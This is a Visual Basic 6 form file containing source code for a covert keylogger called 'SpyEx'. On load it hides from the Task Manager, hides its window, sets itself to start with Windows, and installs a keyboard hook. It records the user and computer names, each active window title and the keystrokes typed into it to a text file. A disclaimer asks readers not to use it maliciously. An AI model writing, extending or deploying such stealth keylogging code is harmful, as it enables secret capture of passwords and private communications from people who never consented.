VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   1080
   ClientLeft      =   60
   ClientTop       =   450
   ClientWidth     =   2070
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   1080
   ScaleWidth      =   2070
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.Timer Timer1 
      Left            =   0
      Top             =   0
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'Please do not use this code maliciously.
'I am in no way responsible for any action taken with the code provided.
'If you have any questions or comments, email me at itcdr@yahoo.com
'I would appreciate it if you could tell me how I could improve my program.
'Thank you.

'API Functions for Window's Titles
Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Private Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Private Declare Function GetForegroundWindow Lib "user32" () As Long
'Variable Declarations
Dim title As String, last As String, strInfo As String, fileName As String
Dim handle As Long, length As Long
Dim i As Integer
Dim fso As New FileSystemObject, txt As TextStream

Private Sub Form_Load()
  'Set Text File path to current path of application
  fileName = App.Path & "\SpyEx.txt"
  
  'Create Text File for data
  Set txt = fso.OpenTextFile(fileName, ForAppending, True)
  
  
  'Write Started time and date to file
  txt.WriteLine ("Started: " & Now)
  
  'Get computer name and current user name and write to file
  Set objNet = CreateObject("WScript.NetWork")
  strInfo = "User Name: " & objNet.UserName & vbCrLf & _
            "Computer Name: " & objNet.ComputerName & vbCrLf
  txt.WriteLine (vbNewLine & strInfo)
  
  'Key list
  keyChar = Array(8, 9, 160, 17, 18, 35, 36, 46, 91, 92, _
                  112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, _
                  32, 106, 107, 109, 110, 111, 186, 187, 188, 189, 190, 191, 192, 219, 220, 221, 222, _
                  96, 97, 98, 99, 100, 101, 102, 103, 104, 105)
  
  keyList = Array("BACK", "TAB", "SHIFT", "CTRL", "ALT", "END", "HOME", "DEL", "LWIN", "RWIN", _
                  "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "F11", "F12", _
                  " ", "*", "+", "-", ".", "/", ";", "=", ",", "-", ".", "/", "`", "[", "\", "[", "'", _
                  "0", "1", "2", "3", "4", "5", "6", "7", "8", "9")
  
  'Hide App from Task Manager
  App.TaskVisible = False
  
  'Hide Window
  Me.Hide
  
  'Start with windows
  startup
    
  'Set Timer to one mili-second
  Timer1.Interval = 1
    
  'Start keyboard hook
  KeyboardHook
End Sub

Private Sub Form_Terminate()
  Unhook
  hook = 0
End Sub

Private Sub Form_Unload(Cancel As Integer)
  'Write Ending time and date to file
  txt.Write (vbNewLine & "Ended: " & Now & vbNewLine & vbNewLine)
  
  'Close File
  txt.Close
  Unhook
  hook = 0
End Sub

Private Sub Timer1_Timer()
  'Set last = current title
  last = title
  
  'Get Active Window handle
  handle = GetForegroundWindow
  
  'Get Active Window Text Length
  length = GetWindowTextLength(handle)
  
  'Create String Buffer
  title = String(length, Chr$(0))
  
  'Get Title of Active Window
  GetWindowText handle, title, length + 1
  
  'Record data from last window when new window is active
  If title <> last And last <> "" Then
    txt.WriteLine ("<<" & last & ">>" & vbTab & keys)
    keys = ""
  End If
End Sub
